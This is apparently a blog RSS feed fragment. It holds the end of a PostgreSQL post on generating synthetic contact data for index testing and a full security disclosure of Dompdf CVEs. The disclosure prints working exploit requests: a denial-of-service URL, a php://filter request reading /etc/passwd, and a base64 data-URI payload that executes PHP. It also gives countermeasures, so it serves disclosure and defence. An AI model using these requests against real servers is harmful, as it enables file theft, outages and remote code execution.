&lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;show_last_name&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- hiding 5 % of first_names&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;generator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)::&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;boolean&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;show_first_name&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- id&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;generator&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;generate_series&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;generator&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main_sub&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;INNER&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;JOIN&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;company&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;ON&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;company&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;comp_id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main_sub&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;comp_id&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;INNER&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;JOIN&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dates1083&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;ON&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dates1083&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rownum&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main_sub&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;base_date_num&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;-- ignore conflicts of ids, but not any checks constraint failure (on dates for example)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;ON&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CONFLICT&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;DO&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;NOTHING&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Here is &lt;a href=&quot;https://github.com/regilero/regilero.github.com/blob/master/theme/resource/pgserie/generating_contacts.sql&quot;&gt;the full and commented version, without the INSERT part&lt;/a&gt;.
There's a lot of elements inside, my advice is to copy that in a pgadmin SQL session and to play with the various columns.
You have siome booleans generated on subqueries, allowing choices adjustemnts with &lt;code&gt;CASE&lt;/code&gt; on the top queries,
to get more various profils, to insert some &lt;code&gt;NULL&lt;/code&gt; sometimes on some non required columns, etc.&lt;/p&gt;

&lt;p&gt;We can of course &lt;a href=&quot;http://sqlfiddle.com/#!17/ec332/2&quot;&gt;see it in SQL Fiddle&lt;/a&gt; where
the model is already present, as we need the company table to get the right email column.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt; id  | con_active | con_first_name |   con_last_name    |                        mail                        |          date_create          |       date_1st_interact       |       date_2nd_interact       |          date_alter           | con_status | comp_id
-----+------------+----------------+--------------------+----------------------------------------------------+-------------------------------+-------------------------------+-------------------------------+-------------------------------+------------+---------
   1 | t          | Coaïco         | Takalaerjac        | coaico.takalaerjac@cocaco-global.com               | 2017-06-16 10:41:28.631596+02 | 2017-06-21 04:01:28.631596+02 | 2017-06-27 18:39:28.631596+02 | 2017-06-27 18:39:28.631596+02 | commercial |    4091
   2 | t          | Nnn            | Otoerkingchen      | nnn.otoerkingchen@sefrafor-international.com       | 2016-03-12 04:25:28.631596+01 | 2016-03-15 07:34:28.631596+01 | 2016-10-22 05:57:28.631596+02 | 2016-10-22 05:57:28.631596+02 | external   |    6055
   3 | t          | Cosyso         | Steinroytakavur    | cosyso.steinroytakavur@gecgipfor-global.com        | 2016-12-16 10:35:28.631596+01 | 2016-12-18 18:11:28.631596+01 | 2016-12-18 18:11:28.631596+01 | 2016-12-18 18:11:28.631596+01 | production |     651
   4 | t          | Michavir       | Ersteinotovur      | michavir.ersteinotovur@gefroca-international.com   | 2012-10-29 12:27:28.631596+01 | 2012-11-03 10:41:28.631596+01 | 2013-06-19 11:21:28.631596+02 | 2013-06-19 11:21:28.631596+02 | external   |    2731
   6 | t          | Ennathche      | Latakamcata        | ennathche.latakamcata@gecforgim-united.com         | 2016-12-15 12:29:28.631596+01 | 2016-12-19 11:12:28.631596+01 | 2017-06-27 18:39:28.631596+02 | 2017-06-27 18:39:28.631596+02 | external   |    8740
   8 | f          |                | Durjactakao'       | borob.durjactakao-@forfrafor-gmbh.com              | 2014-01-13 16:36:28.631596+01 | 2014-01-17 19:08:28.631596+01 | 2014-01-17 19:08:28.631596+01 | 2014-01-17 19:08:28.631596+01 | external   |    1902
   9 | t          | Jamibo         | Jacsteinlason      | jamibo.jacsteinlason@gimgipgim-international.com   | 2011-11-30 08:29:28.631596+01 |                               |                               | 2011-11-30 08:29:28.631596+01 | support    |    3024
  10 | t          | Nathhnnath     | Vurfürsteinking    | nathhnnath.vurfursteinking@sosegip-sons.com        | 2014-08-29 00:10:28.631596+02 | 2014-09-04 05:25:28.631596+02 | 2014-09-04 05:25:28.631596+02 | 2014-09-04 05:25:28.631596+02 | support    |    6006
  13 | t          | Chepeche       | Kleindurotoking    | chepeche.kleindurotoking@sogegec-global.com        | 2011-07-25 03:06:28.631596+02 | 2011-07-28 14:17:28.631596+02 | 2013-08-08 10:32:28.631596+02 | 2013-08-08 10:32:28.631596+02 | direction  |     477
(...)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We'll then need to insert those lines into the contact table. As we could see before on the above pseudo-query.
After the &lt;code&gt;WITH&lt;/code&gt; section we have a &lt;code&gt;SELECT&lt;/code&gt; query, the &lt;code&gt;INSERT INTO contact&lt;/code&gt; part has to be paste just before this select.
At the end we have &lt;a href=&quot;https://github.com/regilero/regilero.github.com/blob/master/theme/resource/pgserie/contacts_insertion.sql#L40-L52&quot;&gt;this insert query&lt;/a&gt;,
where we also add the &lt;code&gt;ON CONFLICT DO NOTHING;&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Then I can insert &lt;strong&gt;1,000&lt;/strong&gt;, &lt;strong&gt;10,000&lt;/strong&gt; or &lt;strong&gt;100,000 contacts&lt;/strong&gt; by simply altering the digits in the last &lt;code&gt;generate_series&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;For SQL Fiddle the model definition and these queries reached the size limit (8000)
so UI had to remove some indexes and some formating and comments, but &lt;a href=&quot;http://sqlfiddle.com/#!17/93004/7&quot;&gt;it works !&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;We can also &lt;a href=&quot;http://sqlfiddle.com/#!17/93004/8&quot;&gt;list some contacts&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Or start to work on &lt;a href=&quot;http://sqlfiddle.com/#!17/93004/6&quot;&gt;some complex query from an application&lt;/a&gt;.
&lt;strong&gt;Since the goels ois normally to find the right indexes&lt;/strong&gt;.&lt;/p&gt;

&lt;h2&gt;Why, by the way?&lt;/h2&gt;

&lt;p&gt;Generating datas based on a &lt;strong&gt;realistic physiognomy of data&lt;/strong&gt; and on &lt;strong&gt;large assemblies&lt;/strong&gt;
will help us validate an indexation scheme, and optimize explains.&lt;/p&gt;

&lt;p&gt;The query shown in &lt;a href=&quot;http://sqlfiddle.com/#!17/93004/6&quot;&gt;this previous Fidlle&lt;/a&gt; and also available &lt;a href=&quot;https://github.com/regilero/regilero.github.com/blob/master/theme/resource/pgserie/query_example.sql&quot;&gt;directly here&lt;/a&gt; is quite awful to optimize, with &lt;code&gt;WINDOW&lt;/code&gt; usage, some subselects, etc.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://regilero.github.io/theme/resource/pgserie/explain1.png&quot;&gt;&lt;/p&gt;

&lt;p&gt;On the other hand, depending on the presence or absence of certain indexes (like the dates partial indexes),
we can obtain some very different explain schemes:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://regilero.github.io/theme/resource/pgserie/explain2.png&quot;&gt;&lt;/p&gt;

&lt;p&gt;But that's another story.&lt;/p&gt;

&lt;h2&gt;Bonus&lt;/h2&gt;

&lt;p&gt;Of course variations on the examples can be made. Here is a link to a &lt;a href=&quot;https://gist.github.com/regilero/e0066e66e2c505f7a0edddf8bf104bb7&quot;&gt;hoity-toity french names generator&lt;/a&gt;.&lt;/p&gt;
</description>
				<published>2017-06-26 00:00:00 +0200</published>
				<link>http://regilero.github.io/postgresql/english/2017/06/26/postgresql_advanced_generate_series/</link>
			</item>
		
			<item>
				<title>Web Security, Dompdf security issues details</title>
				<description>&lt;p&gt;&lt;small&gt;&lt;strong&gt;English version&lt;/strong&gt; (&lt;strong&gt;Version Française&lt;/strong&gt; disponible sur &lt;a href=&quot;http://www.makina-corpus.com/blog/metier/2016/securite-web-detail-de-failles-de-securite-dompdf&quot;&gt;makina corpus&lt;/a&gt;).&lt;/small&gt;
&lt;small&gt;estimated read time: 5min&lt;/small&gt;&lt;/p&gt;

&lt;h2&gt;Dompdf?&lt;/h2&gt;

&lt;p&gt;If you do not know &lt;a href=&quot;https://github.com/dompdf/dompdf&quot;&gt;DomPDF&lt;/a&gt;, that's a really nice library to render PDF document with PHP scripts.
I mean it, for anyone which already have had to use some other HTML to PDF converters, this library looks very nice.&lt;/p&gt;

&lt;p&gt;Now, this lib made a thing that I consider a huge mistake for a library,
they provided, for years, a nice gui, directly in the library. From this GUI you
could check your settings, test the library tools, etc.&lt;/p&gt;

&lt;p&gt;This looks like a nice tool, and in term of pure marketing (targeted to
developers and integrators), that's a really powerful utility.&lt;/p&gt;

&lt;p&gt;But in the past this has lead to some security issues, like this &lt;a href=&quot;https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2014-2383/&quot;&gt;CVE-2014-2383&lt;/a&gt;,
&quot;Information disclosure, arbitrary file read&quot;.&lt;/p&gt;

&lt;p&gt;And in this post I'll describe 3 new CVE, discovered after this one, first
reported to the project in june 2014, and fixed in version 0.6.2 in december 2015 (so, almost 2016).&lt;/p&gt;

&lt;p&gt;Note that the &lt;strong&gt;0.7 branch is not impacted&lt;/strong&gt;. Note also that the CVE year is 2014,
but anything downloaded before end of december 2015 was quite certainly impacted.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-5011&quot;&gt;CVE-2014-5011&lt;/a&gt; : Information Disclosure&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-5012&quot;&gt;CVE-2014-5012&lt;/a&gt; : DOS (Deny of Service)&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-5013&quot;&gt;CVE-2014-5013&lt;/a&gt; : RCE (Remote Code Execution), complement of CVE-2014-2383&lt;/li&gt;
&lt;/ul&gt;


&lt;h3&gt;fixed in 0.6.2 ?&lt;/h3&gt;

&lt;p&gt;if you check the &lt;a href=&quot;https://github.com/dompdf/dompdf/releases&quot;&gt;RELEASES&lt;/a&gt; page of the project, and download versions 0.6.0, 0.6.1 and 0.6.2,
to check the differences, you will lose part of the real history.
Version 0.6.1 has been fixed in github fixed after initial release.
You can have a different 0.6.1 version if you downloaded it before.&lt;/p&gt;

&lt;p&gt;The RCE issue has been removed from 0.6.1 but was in fact present in this
version if you downloaded it before (quite certainly before december 2015).&lt;/p&gt;

&lt;h2&gt;CVE-2014-5011 : Information Disclosure&lt;/h2&gt;

&lt;p&gt;This issue is the easy one.&lt;/p&gt;

&lt;p&gt;The library has long been releasing a &lt;code&gt;www&lt;/code&gt; directory, with some PHP files inside.&lt;/p&gt;

&lt;p&gt;Most PHP installation will run any PHP set in the web document root (&lt;strong&gt;note that
it's a good security thing to avoid that and restrict PHP execution to the bootstrapper
only -- &lt;code&gt;index.php&lt;/code&gt; --&lt;/strong&gt;, if you can, and if your application is modern you certainly could, unless
it's Drupal8, because, because, I don't know why they keep putting all libraries
and all PHP sources in the document root, please help me close this parenthesis).&lt;/p&gt;

&lt;p&gt;So, you have this directory, with a lot of PHP scripts available. And one of these
scripts is &lt;code&gt;www/setup.php&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;This script is the definition of an &lt;strong&gt;information Disclosure&lt;/strong&gt;, with real versions
and paths printed on a public page:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/theme/img/posts/yes1.png&quot; width=&quot;1000&quot; height=&quot;648&quot; alt=&quot;gimme some data&quot;/&gt;&lt;/p&gt;

&lt;p&gt;Look at some of theses settings:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/theme/img/posts/yes2.png&quot; width=&quot;924&quot; height=&quot;247&quot; alt=&quot;oyeah, gimme more&quot;/&gt;&lt;/p&gt;

&lt;p&gt;Various fix has been applied on this issue, mainly restricting access on &lt;em&gt;setup&lt;/em&gt;
and some other places to localhost only, so that these pages should not be indexed
by google anymore, and that no hacker could use it to inspect your application
security level so easily.&lt;/p&gt;

&lt;p&gt;Some other informations leaks were available at &lt;code&gt;www/debugger.php&lt;/code&gt; and &lt;code&gt;www/fonts.php&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;We'll see below with the RCE that this disclosure is a really big problem if
some settings are not at the right value.&lt;/p&gt;

&lt;h2&gt;CVE-2014-5012: Deny of Service&lt;/h2&gt;

&lt;p&gt;The library provide an example of implementation, used in the GUI screens,
especially on a demonstration page.&lt;/p&gt;

&lt;p&gt;This script is &lt;code&gt;dompdf.php&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;You can try to use it on some very heavy examples, like the full utf-8 render.
Costly public script, but not enough for a realy DOS vector.&lt;/p&gt;

&lt;p&gt;But a real not-nice-at-all-call is requesting the render of the dompdf configuration file (I first
tried it to check if I would get a pdf with the library settings rendered):&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;dompdf/dompdf.php?base_path=&amp;amp;options[Attachment]=0&amp;amp;input_file=dompdf_config.inc.php
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Something goes wrong while dompdf is trying to render this file, and the
script will never end his task (not until php max memory is reached).&lt;/p&gt;

&lt;p&gt;That's a better Deny of Service vector.&lt;/p&gt;

&lt;h2&gt;And now a Remote command execution ...&lt;/h2&gt;

&lt;h3&gt;Back to the old CVE-2014-2383&lt;/h3&gt;

&lt;p&gt;This previous CVE &lt;a href=&quot;https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2014-2383/&quot;&gt;CVE-2014-2383&lt;/a&gt; (which is not mine) was available on
version 0.6.0 (now a really old version).&lt;/p&gt;

&lt;p&gt;The attack used &lt;code&gt;php://filter&lt;/code&gt; to extract any file readable by PHP on the server
(open_basedir is a limitation on which file are available, and finding path to files is not always easy, but refer to the
Information Disclosure problem for a full access to open_basedir setting value or paths).&lt;/p&gt;

&lt;p&gt;It also used the &lt;code&gt;dompdf.php&lt;/code&gt; file, present in the library, which is necessary for
the gui demonstrations, but is in fact useless for most dompdf integration (it
means one of the simplest way of fixing this issue, the DOS and the RCE is to
remove this file).&lt;/p&gt;

&lt;p&gt;Say, if you want to read the &lt;code&gt;/etc/passwd&lt;/code&gt; file you can try something like
&lt;code&gt;/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/etc/passwd&lt;/code&gt; and
the result, in a PDF document, is this file, simply base64 encoded (use base64
decode and you have the file content). The &lt;em&gt;&lt;code&gt;php://filter+base64&lt;/code&gt;&lt;/em&gt; trick is the
new way of doing local file inclusions with modern PHP.&lt;/p&gt;

&lt;p&gt;This issue was fixed in 0.6.1.&lt;/p&gt;

&lt;p&gt;The &lt;code&gt;php://&lt;/code&gt; filter support was removed.&lt;/p&gt;

&lt;h3&gt;CVE-2014-5013 RCE: exploit data uri instead of php:// filter&lt;/h3&gt;

&lt;p&gt;An RCE, or Remote Code Execution is a very bad issue. It means attackers can run
their own PHP code on your server. From that you cannot do a lot of things.&lt;/p&gt;

&lt;p&gt;Before giving the details, I'll give the first counter measures.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Do not allow &lt;code&gt;DOMPDF_ENABLE_PHP&lt;/code&gt;&lt;/strong&gt; : that's the default setting, it's forbidden
by default, if you ever enabled that please remove it, right now. This setting's default
protected you from the previous &lt;code&gt;php://&lt;/code&gt; filter attack also.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Do not allow &lt;code&gt;DOMPDF_ENABLE_REMOTE&lt;/code&gt;&lt;/strong&gt; : same thing, default is false, if you
set true remove it, right now, or set your dompdf version to 0.6.2 or greater.&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;Note that the Information Disclosure issue &lt;strong&gt;will&lt;/strong&gt; reveal theses settings to
everybody, even google.&lt;/p&gt;

&lt;p&gt;Let's first have a look at theses strange settings, that you should not allow,
from the config file:&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;/**&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;* Enable inline PHP&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;* If this setting is set to true then DOMPDF will automatically evaluate&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;* inline PHP contained within &amp;lt;script type=&amp;quot;text/php&amp;quot;&amp;gt; ... &amp;lt;/script&amp;gt; tags.&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;* Attention!&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;* Enabling this for documents you do not trust (e.g. arbitrary remote html&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;* pages) is a security risk. Inline scripts are run with the same level of&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;* system access available to dompdf. Set this option to false (recommended)&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;* if you wish to process untrusted documents.&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;* @var bool&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;*/&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;def(&amp;quot;DOMPDF_ENABLE_PHP&amp;quot;, false);&lt;/span&gt;

&lt;span class=&quot;x&quot;&gt;/**&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt; * Enable remote file access&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt; *&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt; * If this setting is set to true, DOMPDF will access remote sites for&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt; * images and CSS files as required.&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt; * This is required for part of test case www/test/image_variants.html through www/examples.php&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt; *&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt; * Attention!&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt; * This can be a security risk, in particular in combination with DOMPDF_ENABLE_PHP and&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt; * allowing remote access to dompdf.php or on allowing remote html code to be passed to&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt; * $dompdf = new DOMPDF(); $dompdf-&amp;gt;load_html(...);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt; * This allows anonymous users to download legally doubtful internet content which on&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt; * tracing back appears to being downloaded by your server, or allows malicious php code&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt; * in remote html pages to be executed by your server with your account privileges.&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt; *&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt; * @var bool&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt; */&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;def(&amp;quot;DOMPDF_ENABLE_REMOTE&amp;quot;, false);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Reading that I wonder &lt;strong&gt;why people would activate these settings&lt;/strong&gt; ? In fact the
&lt;em&gt;&lt;code&gt;enable_remote&lt;/code&gt;&lt;/em&gt; is the easiest way to have images in your PDF, if you have
absolute domains uri for images you will need to enable this option to have
dompdf fetch the image and render it.&lt;/p&gt;

&lt;p&gt;The &lt;em&gt;&lt;code&gt;enable_php&lt;/code&gt;&lt;/em&gt; part is worst, it is a way of defining PDF specific tasks in a
php script, using an HTML template. with some provided variables like &lt;code&gt;$pdf&lt;/code&gt;,
&lt;code&gt;$PAGE_NUM&lt;/code&gt; and &lt;code&gt;$PAGE_COUNT&lt;/code&gt;. The new versions use css markup for such tasks.
Using a PHP eval to run this sort of task was a bad idea. It leads to a real call to
&lt;code&gt;eval()&lt;/code&gt; in the code, that we will exploit.&lt;/p&gt;

&lt;p&gt;The &lt;code&gt;dompdf.php&lt;/code&gt; script can render a pdf, the &lt;em&gt;input_file&lt;/em&gt; parameter could be a file,
but also a protocol. Anything detected as a remote protocol will only be available
in &lt;em&gt;enable_remote&lt;/em&gt; mode.&lt;/p&gt;

&lt;p&gt;The previous security issue used the &lt;code&gt;php://&lt;/code&gt; protocol, which was then filtered.&lt;/p&gt;

&lt;p&gt;The &lt;code&gt;data://&lt;/code&gt; protocol is not blocked and is sometime used to embed images in the
PDF by giving the full encoded image as a data uri parameter.&lt;/p&gt;

&lt;p&gt;The old trick for dompdf images was using HTML sources in this form:&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;img&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;data:image/jpeg;base64,HERE_SOME_BASE64_ENCODED_BINARY_THINGS&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Using &lt;strong&gt;data&lt;/strong&gt; to embed images in the PDF is a nice hack, if you have never seen a
data-uri image check github's 404 pages HTML sources.&lt;/p&gt;

&lt;p&gt;But the &lt;a href=&quot;https://developer.mozilla.org/fr/docs/Web/HTTP/Basics_of_HTTP/Data_URIs&quot;&gt;data-uri&lt;/a&gt; protocol is not limited to images support.
It can embed any mime document. A php script for example is a document with
mime type &lt;code&gt;application/x-httpd-php&lt;/code&gt; (you could also try XML files for XXE issues).&lt;/p&gt;

&lt;p&gt;Let's say I have this small PHP script:&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;PHP RCE : &amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;phpversion&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;bye&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Note that I could do some other things in PHP, that's just an example.&lt;/p&gt;

&lt;p&gt;In a data URI source this same PHP script content can be written like that (base64 encoding is just a way of rewritting something in ascii-7):&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;data:application/x-httpd-php;charset=utf-8;base64,PD9waHANCmVjaG8gJ1BIUCBSQ0UgOiAnIC4gcGhwdmVyc2lvbigpOw0KZWNobyAiYnllIjsNCj8+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;With some url encoding (because we'll use that on an url) that is:&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;data%3Aapplication%2Fx-httpd-php%3Bcharset%3Dutf-8%3Bbase64%2CPD9waHANCmVjaG8gJ1BIUCBSQ0UgOiAnIC4gcGhwdmVyc2lvbigpOw0KZWNobyAiYnllIjsNCj8%2B&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;And the final attack is:&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;http://&lt;span class=&quot;nt&quot;&gt;&amp;lt;target&amp;gt;&lt;/span&gt;/&lt;span class=&quot;nt&quot;&gt;&amp;lt;path&amp;gt;&lt;/span&gt;/dompdf/dompdf.php?base_path=&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;options[Attachment]=0&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;input_file=data%3Aapplication%2Fx-httpd-php%3Bcharset%3Dutf-8%3Bbase64%2CPD9waHANCmluY2x1ZGUgKCcvZXRjL3Bhc3N3ZCcpOw0KZWNobyAiYnllIjsNCj8%2B&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;If default settings for &lt;code&gt;DOMPDF_ENABLE_PHP&lt;/code&gt; and &lt;code&gt;DOMPDF_ENABLE_REMOTE&lt;/code&gt; are
altered (to true) this attack will successfully run the PHP script and render
the output of this script to a PDF document (which is in fact only an optionnal side-effect).
This Can be used for local or remote
file inclusion, but also to edit or create a php file, run a shell script, etc.
Chances are this exploit would be used to connect your server in a botnet.&lt;/p&gt;

&lt;h2&gt;Last words&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;Avoid using &lt;code&gt;eval()&lt;/code&gt; in your web code&lt;/li&gt;
&lt;li&gt;Avoid adding demonstrations to your libraries, or ensure that they will not
run in production&lt;/li&gt;
&lt;li&gt;Update your dompdf installation. Version 0.7 is a revolution, it may be hard
to switch to that version, but moving an old 0.6.0 or 0.6.1 version to 0.6.2
should be straightforward, if it breaks something revert the code and check next
point.&lt;/li&gt;
&lt;li&gt;if you use dompdf in a cms, you can safely &lt;strong&gt;remove the &lt;code&gt;www&lt;/code&gt; subdirectory
and the &lt;code&gt;dompdf.php&lt;/code&gt; file&lt;/strong&gt; in that library, rename it first if you do not
believe me, the CMS is quite certainly using the library classes, and not the
demonstration code and runner.&lt;/li&gt;
&lt;li&gt;if you enabled the two dangerous settings, then revert it even if it breaks
something (choose between breaking a features and giving your server to spammers)&lt;/li&gt;
&lt;li&gt;if you use a modern PHP application, please put PHP libraries outside of the
web document root.&lt;/li&gt;
&lt;/ul&gt;

</description>
				<published>2016-12-19 00:00:00 +0100</published>
				<link>http://regilero.github.io/security/english/2016/12/19/security_dompdf_rce/</link>
			</item>
		
